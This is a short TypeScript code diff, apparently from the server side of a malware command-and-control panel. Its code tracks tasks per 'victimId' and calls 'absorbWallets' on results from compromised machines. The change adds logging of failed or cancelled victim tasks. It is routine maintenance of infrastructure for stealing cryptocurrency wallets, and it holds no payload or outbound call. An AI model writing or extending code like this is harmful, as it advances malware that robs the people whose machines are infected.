@@ -1,5 +1,6 @@
 import { prisma } from './db';
 import { publish } from './bus';
+import { recordFailure } from './ws-events';
 
 export type ResultBody = {
   status: 'ok' | 'error' | 'cancelled';
@@ -53,6 +54,10 @@ export async function applyTaskResult(victimId: string, taskId: string, input: R
     });
   }
   if (input.status === 'ok') await absorbWallets(victimId, input.result);
+  else {
+    await recordFailure(victimId, 'task_failed', `${task.name}:${(input.error ?? input.status).slice(0, 120)}`,
+      `task ${task.name} ${input.status}: ${input.error ?? ''}`).catch(() => undefined);
+  }
   if (task.name === 'cancel') {
     // The cancel task answers last; make sure the target also closes.
     const target = typeof (task.params as { task_id?: string }).task_id === 'string'
